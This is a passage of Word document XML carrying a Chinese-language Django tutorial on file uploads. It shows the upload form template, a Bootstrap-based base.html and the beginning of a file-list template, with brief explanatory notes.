        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">  {% csrf_token %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BF0F406" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">  {{ form.as_p }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="440928BD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;button class="btn btn-info form-control " type="submit" value="submit"&gt;Upload&lt;/button&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A752E43" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/form&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F4EC9FF" w14:textId="2E6CAEA8" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% endblock %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CA80716" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>注意： </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5524D3D2" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>发送&lt;form&gt;必需有属性enctype="multipart/form-data"，否则表单不能发送文件，request.FILES为空。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00DF10CF" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们的模板继承了base.html, 别忘了添加哦， 目的是为了显示更漂亮。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08948FCC"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#file_upload/templates/base.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F905248" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% load static %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C64ACE0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="040E35CC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;html lang="en"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F870177" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;head&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BE0E342" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;title&gt;{% block title %}Django File Upload and Download{% endblock %} &lt;/title&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B38A101" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;meta charset="utf-8"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="375265E5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19EEFAED" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78637746" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/head&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BD04EC4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B1C02ED" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;body&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C6A367C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;!-- Page content of course! --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20111617" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;main class="container-fluid"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F15BBAB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;div class="container"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1160EF2B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52928067" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> {% block content %} {% endblock %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27715B5A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="699A8AF5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">&lt;/div&gt; </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="522DFE77" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/main&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FD18535" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53211507" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;!-- Bootstrap core JavaScript</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4858AD40" w14:textId="6E26569C" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>================================================== --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21614E7E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"&gt;&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="662DAAF3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"&gt;&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17BE0146" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E0F55CD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% block js %} {% endblock %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35897696" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="404568A9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/body&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="465D3A3C" w14:textId="75971674" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="018FECD3" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D9C7947" w14:textId="457D2CA4" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>普通表单上传文件页面显示如下所示:</w:t>
      </w:r>
      <w:r w:rsidR="0047302B">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>图略</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16E54AF6" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>显示文件清单模板file_list.html代码如下所示:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75797700"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#file_upload/templates/file_list.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EA3D392" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% extends "file_upload/base.html" %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="601160FB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5BAB31B0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% block content %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3696708B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;h3&gt;File List&lt;/h3&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71DB47B7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;p&gt; &lt;a href="/file/upload1/"&gt;RegularFormUpload&lt;/a&gt; | &lt;a href="/file/upload2/"&gt;ModelFormUpload&lt;/a&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38493F5B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    | &lt;a href="/file/upload3/"&gt;AjaxUpload&lt;/a&gt;&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B766AB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% if files %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22D123AF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;table class="table table-striped"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CBF321E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06E853E0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;tbody&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A6ABD59" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;tr&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02F796B7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        &lt;td&gt;Filename &amp; URL&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="755393BF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        &lt;td&gt;Filesize&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
